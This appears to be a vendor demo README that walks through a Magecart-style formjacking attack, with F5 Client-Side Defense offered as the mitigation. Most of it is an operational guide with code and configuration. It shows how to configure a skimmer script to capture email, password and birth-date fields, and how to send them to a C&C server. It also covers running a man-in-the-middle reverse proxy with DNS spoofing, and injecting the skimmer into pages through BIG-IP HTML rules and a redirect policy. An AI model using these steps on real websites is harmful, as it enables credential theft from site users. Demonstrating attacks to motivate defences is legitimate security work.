Formjacking Attack
##############################################################

.. image:: ./_pictures/UFO_mamy.png
   :align: center
   :width: 800
   :alt: All layers

.. contents:: Contents
    :local:

Introduction
*****************************************

This blog provides a formjacking code in order to understand how it works.

F5 customers are protected from magecart style attack by `F5 Client-Side Defense <https://www.f5.com/cloud/products/client-side-defense>`_:

    - **Analyse** the behavior of all Javascripts executed on your website
    - **Alert** your Cyber-SOC team if a javascript behaves like a malware and take action immediately (allow/block)
    - **Block** malicious Javascript execution

Thanks to `unit42 <https://unit42.paloaltonetworks.com/>`_ that did a great blog `here <https://unit42.paloaltonetworks.com/anatomy-of-formjacking-attacks/>`_ on this topic.

Configuration guide
*****************************************
- Open the web page with targeted form
- Inspect ``input`` elements to grab user data. Each element can be identified by an ``id``, a ``name``, a ``type``, etc...

.. code-block:: html

    <input ... id="login-credentials-form-password" name="password-uuid" type="password" ...>

- Open the file `skimmer.js <https://github.com/nergalex/f5-magecart/blob/master/skimmer.js>`_
- Update the first 2 or 3 lines describing ``input`` elements to grab user data. See `examples </example>`_

.. code-block:: javascript

    window["data_leak_label_email"] = ["input[id*='login-credentials-form-email']", "input[name*='email']", "input[type*='email']"]
    window["data_leak_label_password"] = ["input[id*='login-credentials-form-password']", "input[name*='password']"]
    window["data_leak_label_birth_date"] = ["input[id*='login-credentials-form-birthdate']", "input[name*='birthDate']"]

- Go back to the web page, inspect ``button`` elements when the user submit the form

.. code-block:: html

    <button ... type="submit" id="login-button">

- In `skimmer.js <https://github.com/nergalex/f5-magecart/blob/master/skimmer.js>`_, the
- The fourth line describes ``button`` element to watch in order to send data to remote C&C server.
.. code-block:: javascript

    window["data_leak_label_submit_button"] = ["button[id*='login-button']"]

- If the form contains more or less input fields, update ``function listener_fetch_data_leak()`` in order to have exactly all required ``input`` elements defined previously

.. code-block:: javascript

    data_leak = {
        "email": get_element_value(window["data_leak_label_email"]),
        "password": get_element_value(window["data_leak_label_password"]),
        "birth_date": get_element_value(window["data_leak_label_birth_date"]),
        "uagent": navigator.userAgent
    }

Deployment guide
*****************************************

C&C server
=========================================
- Run C&C server as described `here <https://github.com/nergalex/c2-server>`_

Man In the Middle
=========================================
- Run a Reverse-Proxy that acts as a Man-In-The-Middle: forward all traffic to ORIGIN servers
- If DNS domain is spoofed, rewrite SNI and headers (HOST, ORIGIN and eventually others required by the App)
- Inject malware JS `skimmer.js <https://github.com/nergalex/f5-magecart/blob/master/skimmer.js>`_ in all or specific pages

BIG-IP UI configuration for JS insertion:

    Local Traffic  ››  Profiles : Content : HTML : Rules /Common/form_grabber
    +-- Match settings ››  Match Tag Name: head
    +-- Action settings ››  HTML to Append: copy paste content of `skimmer.js <https://github.com/nergalex/f5-magecart/blob/master/skimmer.js>`_ surrounded by <script>...</script>

    Local Traffic  ››  Profiles : Content : HTML : /Common/html-demo
    +-- HTML rules: form_grabber

    Local Traffic  ››  Virtual Servers ››  vs-demo
    +-- HTML Profile: html-demo

BIG-IP UI configuration for JS redirection:

    Local Traffic  ››  Profiles : Content : HTML : Rules /Common/form_grabber
    +-- Match settings ››  Match Tag Name: head
    +-- Action settings ››  HTML to Append: <script src="/magecart.js"></script>

    Local Traffic  ››  Profiles : Content : HTML : /Common/html-demo
    +-- HTML rules: form_grabber

    Local Traffic  ››  Virtual Servers ››  vs-demo
    +-- HTML Profile: html-demo

    Local Traffic  ››  Policies : Policy csd-magecart (see tmsh config below)

    Local Traffic  ››  Virtual Servers ››  vs-demo
    +-- HTML Profile: html-demo
    +-- ltm policy: csd-magecart

.. code-block:: tcl

    ltm policy csd-magecart {
        rules {
            redirect-to-magecart-js {
                actions {
                    0 {
                        http-uri
                        replace
                        path /nergalex/f5-magecart/master/example/skimmer_website12.js
                    }
                    1 {
                        http-host
                        replace
                        value raw.githubusercontent.com
                    }
                    2 {
                        forward
                        select
                        pool raw.githubusercontent.com
                    }
                    3 {
                        http-header
                        response
                        replace
                        name Content-Type
                        value "application/javascript; charset=UTF-8"
                    }
                }
                conditions {
                    0 {
                        http-host
                        host
                        values { demo.com }
                    }
                    1 {
                        http-uri
                        path
                        values { /magecart.js }
                    }
                }
            }
            default {
                actions {
                    0 {
                        forward
                        select
                        pool demo.com
                    }
                }
                conditions {
                    0 {
                        http-host
                        host
                        values { demo.com }
                    }
                }
                ordinal 1
            }
        }
        strategy first-match
    }

- Enable compression on client-side / downstream-side if ORIGIN servers use compression

Mitigation guide
*****************************************
- Connect to F5 Distributed Cloud
- Get your Client Side Defense JS (CSD)
- Inject CSD JS as well in the web page to protect

BIG-IP UI configuration for JS insertion:

    Local Traffic  ››  Profiles : Content : HTML : Rules /Common/f5_csd
    +-- Match settings ››  Match Tag Name: head
    +-- Action settings ››  HTML to Append: copy paste F5 CSD JS link

    Local Traffic  ››  Profiles : Content : HTML : /Common/html-demo
    +-- HTML rules: form_grabber + f5_csd


